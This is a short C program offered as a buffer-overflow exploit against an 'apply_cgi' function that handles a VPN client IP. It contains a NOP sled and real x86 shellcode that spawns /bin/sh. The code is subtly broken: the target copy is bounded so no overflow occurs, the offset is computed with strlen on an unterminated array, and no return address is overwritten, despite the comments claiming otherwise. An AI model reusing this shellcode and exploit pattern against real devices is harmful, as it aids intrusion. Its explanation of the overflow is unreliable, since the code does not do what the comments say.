#include <stdio.h>
#include <string.h>

#define MAX_LEN 256
#define BUFFER_OVERRUN_LENGTH 50
#define SHELLCODE_LENGTH 32

// NOP sled to increase the chance of successful shellcode execution
char nop_sled[SHELLCODE_LENGTH] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

// Shellcode to execute /bin/sh
char shellcode[SHELLCODE_LENGTH] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

void apply_cgi(char *vpn_client_ip) {
    char buffer[MAX_LEN];
    strncpy(buffer, vpn_client_ip, MAX_LEN);
    printf("Client IP: %s\n", buffer);
}

int main() {
    char input[MAX_LEN + BUFFER_OVERRUN_LENGTH] = {0};
    // Create a buffer with the malicious input
    // including the NOP sled, shellcode, and the overflow data
    int offset = strlen(nop_sled) + strlen(shellcode) - BUFFER_OVERRUN_LENGTH;
    strncpy(&input[0], nop_sled, offset);
    strncpy(&input[offset], shellcode, SHELLCODE_LENGTH);
    input[MAX_LEN + BUFFER_OVERRUN_LENGTH - 1] = '\x00';
    // Call the vulnerable function to trigger the buffer overflow
    apply_cgi(input);
    return 0;
}
